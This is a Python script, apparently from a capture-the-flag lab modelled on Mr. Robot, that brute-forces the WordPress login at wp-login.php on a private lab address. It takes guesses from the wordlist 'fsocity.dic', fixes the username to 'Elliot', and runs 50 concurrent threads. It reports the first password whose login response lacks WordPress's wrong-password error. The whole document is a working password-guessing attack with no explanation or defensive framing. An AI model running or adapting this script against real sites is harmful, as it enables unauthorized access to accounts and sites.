import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://10.10.49.252/wp-login.php"

def doLogin(pwd):
	loginBody = {
		'log': 'Elliot',
		'pwd': pwd,
		'wp-submit': 'Log In'
	}

	return (requests.post(url, loginBody).text, pwd)

with ThreadPoolExecutor(max_workers = 50) as executor:
	with open('fsocity.dic') as wordlist:
		futures = []
		lines = [line.strip() for line in wordlist.readlines() if line]
		lines = set(lines)
		for line in lines:
			futures.append(executor.submit(doLogin,line))
		for future in as_completed(futures):
			if future.result()[0].find("The password you entered for the username") == -1:
				print(future.result()[1])
				break
